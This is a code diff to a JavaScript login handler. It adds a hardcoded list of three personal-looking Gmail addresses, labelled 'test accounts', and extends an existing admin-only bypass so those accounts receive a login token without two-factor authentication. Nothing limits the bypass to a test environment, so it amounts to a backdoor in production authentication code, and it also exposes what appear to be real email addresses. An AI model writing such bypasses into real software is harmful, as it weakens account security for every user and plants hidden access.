@@ -168,8 +168,11 @@ exports.login = async (req, res) => {
     user.lastLogin = new Date();
     await user.save();
 
+    // Test accounts bypass 2FA requirement for testing purposes
+    const testAccounts = ['maaadooo2001@gmail.com', 'maaadooo.2001@gmail.com', 'maaadooo20.01@gmail.com'];
+    
     // Admin bypass 2FA requirement
-    if (user.role === 'admin') {
+    if (user.role === 'admin' || testAccounts.includes(user.email.toLowerCase())) {
       const token = generateToken(user._id);
       
       return res.json({
